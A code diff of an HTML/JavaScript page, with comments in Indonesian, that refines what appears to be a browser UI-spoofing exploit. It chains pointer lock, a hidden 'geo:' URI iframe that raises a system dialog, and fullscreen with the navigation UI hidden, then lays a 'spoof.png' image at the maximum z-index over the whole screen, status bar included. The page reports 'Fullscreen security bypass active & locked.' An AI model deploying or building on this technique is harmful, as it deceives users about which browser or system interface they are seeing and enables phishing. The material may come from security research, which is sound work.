@@ -9,6 +9,7 @@
         margin: 0;
         padding: 0;
         height: 100%;
+        width: 100%;
         background: #0b0e14;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         color: #f0f6fc;
@@ -16,6 +17,14 @@
         align-items: center;
         justify-content: center;
         overflow: hidden;
+      }
+      #fullscreenElement {
+        position: relative;
+        width: 100%;
+        height: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
       }
       .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
       button {
@@ -42,13 +51,15 @@
         padding: 0 10px;
       }
       #spoof {
-        position: fixed;
+        position: absolute;
         top: 0;
         left: 0;
-        width: 100vw;
-        height: 100vh;
+        width: 100%;
+        height: 100%;
+        min-width: 100vw;
+        min-height: 100vh;
         object-fit: cover;
-        z-index: 999999;
+        z-index: 2147483647; /* Nilai z-index maksimal untuk menembus seluruh lapisan UI sistem peramban */
         pointer-events: none;
       }
       #pointerLockElement {
@@ -81,7 +92,7 @@
     <div id="pointerLockElement"></div>
 
     <div id="fullscreenElement">
-      <!-- Elemen Gambar Spoof yang menutupi seluruh layar secara absolut -->
+      <!-- Elemen Gambar Spoof yang menutupi seluruh layar secara absolut menembus batas status bar -->
       <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">
 
       <div class="container" id="mainContainer">
@@ -99,7 +110,7 @@
         this.style.display = "none";
 
         try {
-          // 1. Eksekusi Pointer Lock secara sinkron/asinkron untuk mengikat konteks fokus pointer
+          // 1. Eksekusi Pointer Lock secara asinkron untuk mengikat konteks fokus pointer
           let plElement = document.getElementById("pointerLockElement");
           if (plElement && plElement.requestPointerLock) {
             try {
@@ -109,7 +120,7 @@
             }
           }
 
-          // 2. Memicu iframe skema URI 'geo:' untuk memunculkan dialog sistem secara instan menutupi area bilah status
+          // 2. Memicu iframe skema URI 'geo:' untuk memunculkan dialog sistem secara instan
           let spoofFrame = document.createElement("iframe");
           spoofFrame.style.display = "none";
           spoofFrame.src = "geo:0,0?q=apple.com";
@@ -134,7 +145,6 @@
 
             if (requestFS) {
               requestFS.call(fsElement, { navigationUI: "hide" }).catch((err) => {
-                // Fallback otomatis jika opsi objek ditolak oleh kebijakan versi peramban tertentu
                 try {
                   requestFS.call(fsElement);
                 } catch (e) {
@@ -150,7 +160,7 @@
             }
             
             statusInfo.innerText = "Status: Fullscreen security bypass active & locked.";
-          }, 280);
+          }, 300);
 
         } catch (err) {
           statusInfo.innerText = "Status: Critical execution error: " + err.message;
